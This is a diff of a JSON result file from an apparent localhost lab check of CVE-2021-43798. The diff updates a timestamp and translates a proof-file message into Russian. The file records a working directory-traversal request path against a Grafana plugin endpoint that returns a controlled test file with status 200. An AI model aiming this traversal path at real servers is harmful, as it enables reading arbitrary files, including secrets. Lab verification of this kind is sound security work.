@@ -1,6 +1,6 @@
 {
   "cve": "CVE-2021-43798",
-  "checked_at": "2026-10-25T14:29:34.345032+00:00",
+  "checked_at": "2026-10-26T16:20:44.981220+00:00",
   "scope": "127.0.0.1:18083/18084",
   "environments": [
     {
@@ -20,7 +20,7 @@
       "traversal": {
         "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-proof.txt",
         "status": 200,
-        "body": "LAB2-CVE-2021-43798-CONTROLLED-FILE\nSynthetic training evidence, contains no personal data or secrets.\n"
+        "body": "LAB2-CVE-2021-43798-CONTROLLED-FILE\nУчебный файл для проверки обхода каталога; персональных данных и секретов нет.\n"
       },
       "missing": {
         "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-nonexistent.txt",
